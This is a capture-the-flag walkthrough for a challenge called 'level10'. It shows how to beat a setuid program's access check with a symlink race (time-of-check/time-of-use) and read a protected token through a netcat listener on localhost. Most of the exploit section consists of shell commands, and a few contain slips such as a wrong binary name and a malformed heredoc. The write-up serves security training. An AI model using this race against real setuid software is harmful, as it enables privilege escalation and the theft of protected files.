# Level10
## Step by step
### 1. Access the `level10` Home Directory
  ```bash
  > ls -la
  -rwsr-sr-x+ 1 flag10  level10 10817 Mar  5  2016 level10
  -rw-------  1 flag10  flag10     26 Mar  5  2016 token
  ```
---
### 2. Understanding the `level10` Program

The `level10` program accepts a file path as an argument and prints the contents of that file to a port listening on `6969`.

  ```bash
  > echo coucou >/tmp/test
  > nc -l localhost 6969

  
  > ./level /tmp/test 127.0.0.1
  coucou # from the nc command
  ```
---
### 3. Handling the `token` File

When you try to pass the `token` file as an argument to `level10`, you will encounter an access restriction:
  ```bash
  > ./level10 ~/token 127.0.0.1
  You don't have access to token
  ```
---
### 4. Exploiting the Access Control

To bypass the access restriction, you need to create a symbolic link and manipulate access:

  ```bash
  > cat <<hey >/tmp/script.sh
  > touch /tmp/tmp;
  > ln -sf /tmp/tmp /tmp/exploit
  > ./level10 /tmp/exploit 127.0.0.1 &
  > ln -sf ~/token /tmp/exploit
  > hey

  > nc -l localhost 6969
  > /tmp/script.sh
  .*( )*.
  XXX
  ```
